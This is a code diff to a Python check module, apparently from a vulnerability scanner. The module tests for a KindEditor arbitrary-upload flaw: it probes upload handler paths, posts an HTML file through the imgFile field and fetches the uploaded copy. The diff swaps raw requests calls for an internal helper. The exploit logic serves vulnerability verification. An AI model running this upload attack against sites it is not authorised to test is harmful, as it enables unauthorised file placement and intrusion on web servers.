@@ -5,9 +5,8 @@ name: kindeditor上传漏洞
 description: kindeditor上传漏洞
 '''
 import re
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class Upload_File_BaseVerify:
     def __init__(self, url):
@@ -51,7 +50,7 @@ class Upload_File_BaseVerify:
             self.url = "http://" + self.url
         for url in site_type:
             check_url = self.url + url + '?dir=file'
-            check = requests.get(check_url, headers = self.headers, allow_redirects = False, verify = False)
+            check = request.get(check_url, headers = self.headers)
             if check.status_code == 200:
                 self.path = check_url
                 return True
@@ -65,13 +64,13 @@ class Upload_File_BaseVerify:
                 files = {
                     'imgFile': ('test.html', self.html_payload, 'application/octet-stream')
                 }
-                upload_html = requests.post(self.path, headers = self.headers, files = files, timeout = 10, allow_redirects = False, verify = False)
+                upload_html = request.post(self.path, headers = self.headers, files = files)
                 if upload_html.status_code == 200:
                     pattern = re.compile('{"error":0,"url":"(.*?)"}')
                     #print(upload_html.text)
                     html = pattern.findall(upload_html.text)[0].replace('\\', '').split('/')
                     html_path = '/' + '/'.join(html[2:])
-                    check_html = requests.get(self.url + html_path, headers = self.headers, allow_redirects = False, verify = False)
+                    check_html = request.get(self.url + html_path, headers = self.headers)
                     '''if check_html.status_code == 200:
                         print("存在kindeditor上传漏洞")
                         return True'''
